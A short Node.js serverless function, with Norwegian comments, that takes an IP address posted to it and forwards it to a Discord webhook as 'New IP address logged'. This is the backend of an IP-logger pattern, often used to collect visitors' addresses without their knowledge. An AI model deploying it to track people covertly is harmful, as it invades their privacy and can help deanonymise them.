const fetch = require('node-fetch');

exports.handler = async (event) => {
    if (event.httpMethod !== 'POST') {
        return {
            statusCode: 405,
            body: 'Method Not Allowed',
        };
    }

    try {
        const { ip } = JSON.parse(event.body);
        if (!ip) {
            return {
                statusCode: 400,
                body: 'IP not provided',
            };
        }

        // Din Discord webhook URL
        const webhookUrl = 'DIN_DISCORD_WEBHOOK_URL';

        // Meldingen som sendes til Discord
        const message = {
            content: `Ny IP-adresse logget: ${ip}`,
        };

        // Send forespørselen til Discord
        await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(message),
        });

        return {
            statusCode: 200,
            body: 'IP sent to Discord',
        };
    } catch (err) {
        console.error('Error sending IP to Discord:', err);
        return {
            statusCode: 500,
            body: 'Internal Server Error',
        };
    }
};
